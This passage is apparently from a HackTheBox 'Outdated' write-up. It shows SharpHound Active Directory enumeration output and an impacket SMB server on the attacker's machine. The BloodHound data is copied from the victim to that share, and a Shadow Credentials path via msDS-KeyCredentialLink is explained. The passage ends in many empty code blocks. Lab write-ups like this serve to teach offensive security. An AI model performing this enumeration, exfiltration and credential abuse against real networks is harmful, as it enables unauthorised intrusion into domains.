2024-07-02T02:54:45.6002420-07:00|INFORMATION|Status: 97 objects finished (+97 1.94)/s -- Using 59 MB RAM
2024-07-02T02:54:45.6002420-07:00|INFORMATION|Enumeration finished in 00:00:50.9929922
2024-07-02T02:54:45.7565166-07:00|INFORMATION|SharpHound Enumeration Completed at 2:54 AM on 7/2/2024! Happy 
Graphing!
```

```bash
PS C:\Temp> dir
    Directory: C:\Temp
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          7/2/2024   2:54 AM          11198 20240702025444_BloodHound.zip
-a----          7/2/2024   2:54 AM           8662 MjdhMDc5MjItNDk4MS00NjFiLWFkY2ItZjQ0ZTBlODI3Mzhh.bin       
-a----          7/2/2024   2:53 AM         906752 SharpHound.exe
```

```bash
$ impacket-smbserver share $(pwd) -smb2support -user kali -pass kali                                     
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```bash
PS C:\Temp> net use \\10.10.14.2\share /u:kali kali
The command completed successfully.

PS C:\Temp> copy 20240702025444_BloodHound.zip \\10.10.14.2\share
```

```bash
$ sudo neo4j start
$ bloodhound &
```

The members of the group `ITSTAFF@OUTDATED.HTB` have the ability to write to the "`msds-KeyCredentialLink`" property on `SFLOWERS@OUTDATED.HTB`. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT.

![AddKeyCredentialLink](images/bh_AddKeyCredentialLink.png)

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```
